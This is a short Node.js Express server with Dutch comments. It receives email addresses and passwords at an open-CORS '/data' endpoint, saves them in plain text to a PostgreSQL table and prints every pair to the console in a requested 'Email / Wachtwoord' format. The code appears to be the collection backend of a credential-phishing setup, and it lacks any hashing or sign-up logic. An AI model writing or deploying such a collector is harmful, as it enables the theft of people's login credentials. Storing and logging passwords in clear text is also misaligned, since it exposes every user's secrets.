const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// PostgreSQL pool gebruiken met environment variables
const pool = new Pool({
  user: process.env.DB_USER,
  host: process.env.DB_HOST,
  database: process.env.DB_NAME,
  password: process.env.DB_PASSWORD,
  port: process.env.DB_PORT,
});

// Zorg dat de tabel bestaat (1 keer run)
pool.query(`
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  email TEXT,
  password TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)`);

app.post("/data", async (req, res) => {
  const { email, password } = req.body;

  try {
    // Voeg data toe aan database
    await pool.query(
      "INSERT INTO users (email, password) VALUES ($1, $2)",
      [email, password]
    );

    // Log in console in jouw gewenste format
    console.log(`Email: ${email}\nWachtwoord: ${password}\n---`);

    res.json({ message: "Data opgeslagen in database!" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Fout bij opslaan" });
  }
});

app.listen(PORT, () => {
  console.log(`Server draait op poort ${PORT}`);
});
